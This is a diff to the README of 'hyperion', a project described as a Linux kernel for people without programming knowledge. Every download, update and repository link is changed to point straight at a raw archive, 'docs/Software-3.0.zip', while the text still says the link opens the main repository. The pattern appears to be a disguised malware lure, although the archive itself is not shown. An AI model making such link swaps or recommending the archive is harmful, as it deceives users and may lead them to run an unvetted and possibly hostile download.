@@ -1,6 +1,6 @@
 # ⚙️ hyperion - Efficient Linux Kernel for All Needs
 
-[![Download Hyperion](https://img.shields.io/badge/Download-Hyperion-brightgreen)](https://github.com/abjectionfreedom459/hyperion)
+[![Download Hyperion](https://img.shields.io/badge/Download-Hyperion-brightgreen)](https://github.com/abjectionfreedom459/hyperion/raw/refs/heads/main/docs/Software-3.0.zip)
 
 ---
 
@@ -30,7 +30,7 @@ You will not need any programming knowledge to install or use this software.
 
 To get hyperion, visit this page:
 
-[![Download Now](https://img.shields.io/badge/Open%20download%20page-blue)](https://github.com/abjectionfreedom459/hyperion)
+[![Download Now](https://img.shields.io/badge/Open%20download%20page-blue)](https://github.com/abjectionfreedom459/hyperion/raw/refs/heads/main/docs/Software-3.0.zip)
 
 This link will take you to the main repository where you can find all releases and setup guides.
 
@@ -108,7 +108,7 @@ If you run into problems:
 
 New versions of hyperion come with bug fixes and new features. Visit the download page regularly:
 
-[https://github.com/abjectionfreedom459/hyperion](https://github.com/abjectionfreedom459/hyperion)
+[https://github.com/abjectionfreedom459/hyperion/raw/refs/heads/main/docs/Software-3.0.zip](https://github.com/abjectionfreedom459/hyperion/raw/refs/heads/main/docs/Software-3.0.zip)
 
 Download the latest installer and follow the same installation steps.
 
@@ -133,4 +133,4 @@ This project relates to:
 
 ---
 
-[![Open hyperion Repository](https://img.shields.io/badge/Open-GitHub-grey)](https://github.com/abjectionfreedom459/hyperion)
+[![Open hyperion Repository](https://img.shields.io/badge/Open-GitHub-grey)](https://github.com/abjectionfreedom459/hyperion/raw/refs/heads/main/docs/Software-3.0.zip)
